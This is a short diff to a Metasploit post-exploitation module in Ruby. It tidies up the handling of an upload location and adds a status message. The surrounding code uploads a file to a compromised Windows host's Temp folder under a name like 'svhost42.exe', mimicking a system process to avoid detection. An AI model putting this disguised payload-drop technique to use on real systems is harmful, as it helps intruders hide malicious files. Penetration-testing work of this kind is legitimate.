@@ -122,15 +122,17 @@ class Metasploit4 < Msf::Post
     end
   end
 
-  def upload(file, trgloc="")
-    if trgloc == ""
+  def upload(file, trg_loc="")
+    if trg_loc.nil? or trg_loc.empty?
       location = "\\Windows\\Temp"
     else
-      location = trgloc
+      location = trg_loc
     end
 
     file_name  = "svhost#{rand(100)}.exe"
     file_on_target = "#{location}\\#{file_name}"
+
+    print_status("FILE ON TARGET #{file_on_target}")
 
     begin
       upload_file("#{file_on_target}","#{file}")
